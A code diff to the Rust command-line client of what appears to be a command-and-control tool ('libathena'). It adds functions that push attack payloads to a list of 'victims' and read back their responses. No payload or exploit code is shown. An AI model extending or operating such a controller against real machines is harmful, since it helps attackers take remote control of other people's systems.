@@ -15,8 +15,12 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 use std::io::{stdin, BufWriter, Write};
+use std::mem;
 
-use libathena::{payload::attack, AthenaClient, AthenaClientBuilder, AthenaResult, Client};
+use libathena::{
+    payload::attack::{self, PayloadID},
+    AthenaClient, AthenaClientBuilder, AthenaResult, Client,
+};
 
 pub mod commands;
 pub mod errors;
@@ -75,6 +79,8 @@ pub struct State<W: Write> {
     pub client: AthenaClient,
     pub victims: Vec<attack::Victim>,
     pub editor: Option<String>,
+    // (PayloadID, Victim name)
+    pub payload_ids: Vec<(PayloadID, String)>,
 }
 
 impl<W: Write> State<W> {
@@ -90,12 +96,15 @@ impl<W: Write> State<W> {
 
         let victims = client.attack_list_victims().await?;
 
+        let payload_ids = Vec::new();
+
         Ok(Self {
             write,
             mode,
             client,
             victims,
             editor: options.editor.clone(),
+            payload_ids,
         })
     }
 
@@ -142,14 +151,13 @@ Be nice."#,
             for (count, victim) in self.victims.iter().enumerate() {
                 writeln!(self.write, "[{}] {}", count, victim.name)?;
             }
-            writeln!(self.write, "Pick a victim")?;
         }
         self.write.flush()?;
         Ok(())
     }
 
     pub fn select_victim(&mut self, input: &mut String) -> CliResult<()> {
-        self.list_victims()?;
+        writeln!(self.write, "Pick a victim or choose all")?;
         self.mode.clone().print_and_read(self, input)?;
         let victims = vec![self
             .victims
@@ -157,6 +165,27 @@ Be nice."#,
             .unwrap()
             .to_owned()];
         self.victims = victims;
+        Ok(())
+    }
+
+    pub async fn upload_payload(&mut self, payload: &mut attack::Payload) -> CliResult<()> {
+        for victim in self.victims.iter() {
+            payload.victim = victim.name.to_owned();
+            let id = self.client.attack_set_payload(&payload).await?;
+            let name = mem::take(&mut payload.victim);
+            self.payload_ids.push((id, name));
+        }
+        Ok(())
+    }
+
+    pub async fn read_responses(&mut self) -> CliResult<()> {
+        for (id, name) in self.payload_ids.iter() {
+            let resp = self.client.attack_read_response(&id).await?;
+            if let Some(response) = resp.response {
+                write!(self.write, "({}) => {}", &name, &response)?;
+            }
+        }
+        self.write.flush()?;
         Ok(())
     }
 }
